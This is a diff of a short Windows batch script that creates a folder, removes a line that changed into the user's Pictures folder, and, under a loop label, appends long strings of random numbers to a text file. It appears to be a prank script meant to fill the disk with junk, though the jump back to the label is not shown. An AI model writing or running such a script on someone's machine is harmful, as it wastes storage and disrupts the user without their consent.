@@ -1,7 +1,6 @@
 color 0a
 title fr
 mkdir fr
-cd C:\Users\%username%\Pictures\fr
 :top
 echo fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random% >> fr.txt
 mkdir fr.txt
